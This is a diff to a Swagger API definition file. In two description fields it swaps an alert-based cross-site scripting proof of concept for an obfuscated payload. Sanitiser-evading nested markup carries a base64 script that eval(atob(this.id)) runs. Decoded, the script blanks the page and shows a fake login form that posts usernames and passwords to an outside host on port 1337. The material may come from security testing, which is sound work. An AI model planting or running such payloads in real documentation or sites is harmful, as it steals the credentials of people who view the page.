@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.cookie) src=1>"></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x id='ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9Jyc7IHZhciBhPWRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2Zvcm0nKTthLmFjdGlvbj0iaHR0cDovLzE5Mi4xNjguMTc5LjEyODoxMzM3IjthLm1ldGhvZD0nUE9TVCc7YS5pbm5lckhUTUw9JzxjZW50ZXI+VXNlcm5hbWU6IDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJ1c2VyTmFtZSI+PGJyPlBhc3N3b3JkOiA8aW5wdXQgdHlwZT0icGFzc3dvcmQiIG5hbWU9InB3ZCI+PGJyPjxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJMb2dpbiI+PC9jZW50ZXI+JzsgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs=' onerror='eval(atob(this.id))'>"></form>
 
   version: production
 basePath: /JSSResource/
@@ -28,7 +28,7 @@ paths:
     delete:
       parameters:
         - description: |
-            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.cookie) src=1>"></form>
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x id='ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9Jyc7IHZhciBhPWRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2Zvcm0nKTthLmFjdGlvbj0iaHR0cDovLzE5Mi4xNjguMTc5LjEyODoxMzM3IjthLm1ldGhvZD0nUE9TVCc7YS5pbm5lckhUTUw9JzxjZW50ZXI+VXNlcm5hbWU6IDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJ1c2VyTmFtZSI+PGJyPlBhc3N3b3JkOiA8aW5wdXQgdHlwZT0icGFzc3dvcmQiIG5hbWU9InB3ZCI+PGJyPjxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJMb2dpbiI+PC9jZW50ZXI+JzsgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs=' onerror='eval(atob(this.id))'></form>
 
           format: int64
           in: path
